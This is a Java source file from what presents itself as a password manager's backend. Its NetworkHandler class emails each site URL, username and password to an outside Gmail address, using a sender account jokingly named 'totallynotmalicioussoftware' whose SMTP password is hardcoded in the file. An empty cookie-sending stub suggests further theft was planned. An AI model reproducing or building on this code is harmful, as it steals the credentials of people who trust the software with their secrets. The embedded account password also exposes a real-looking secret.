package passwordmanager.backend;

import java.util.Properties;
import javax.mail.Authenticator;
import javax.mail.Message;
import javax.mail.MessagingException;
import javax.mail.PasswordAuthentication;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeMessage;

public class NetworkHandler {
    private Properties props;
    private Authenticator auth;
    private Session session;
    
    public NetworkHandler() {
        props = new Properties();
        props.put("mail.smtp.user", "totallynotmalicioussoftware@gmail.com");
        props.put("mail.smtp.host", "smtp.gmail.com");
        props.put("mail.smtp.port", "465");
        props.put("mail.smtp.starttls.enable", "true");
        props.put("mail.smtp.auth", "true");
        props.put("mail.smtp.socketFactory.port", "465");
        props.put("mail.smtp.socketFactory.class", "javax.net.ssl.SSLSocketFactory");
        auth = new SMTPAuthenticator();
        session = Session.getInstance(props, auth);
    }
    
    public void sendPassword(String siteURL, String username, String password) {
        try {
            MimeMessage message = new MimeMessage(session);
            message.setText("Site: " + siteURL + "\n"
                    + "Username: " + username + "\n"
                    + "Password: " + password);
            message.setSubject("Password");
            message.setFrom(new InternetAddress("totallynotmalicioussoftware@gmail.com"));
            message.addRecipient(Message.RecipientType.TO, new InternetAddress("barronpm@gmail.com"));
            Transport.send(message);
        } catch (MessagingException ex) {
            ex.printStackTrace();
        }
    }
    
    public void sendCookie() {
        
    }
    
    private class SMTPAuthenticator extends Authenticator {
        @Override
        public PasswordAuthentication getPasswordAuthentication() {
            return new PasswordAuthentication("totallynotmalicioussoftware@gmail.com", "638PWXB9F8Wh");
        }
    }
}
